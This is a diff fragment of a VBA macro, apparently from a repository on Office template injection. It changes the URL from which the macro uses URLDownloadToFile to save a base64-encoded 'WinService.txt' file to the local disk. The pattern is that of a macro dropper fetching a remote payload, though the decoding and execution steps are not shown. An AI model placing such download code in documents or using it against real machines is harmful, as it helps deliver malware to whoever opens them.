@@ -18,7 +18,7 @@ Sub download_file(LocalFilePath As String)
 Dim downloadStatus As Variant
 Dim url As String
 
-url = "https://gitlab.com/orgurar/dotm-learn/-/raw/master/WinService.txt"
+url = "https://raw.githubusercontent.com/orgurar/ms-template-injection/master/data/WinService.txt"
 
 ' download base64 file to local disk
 downloadStatus = URLDownloadToFile(0, url, LocalFilePath, 0, 0)
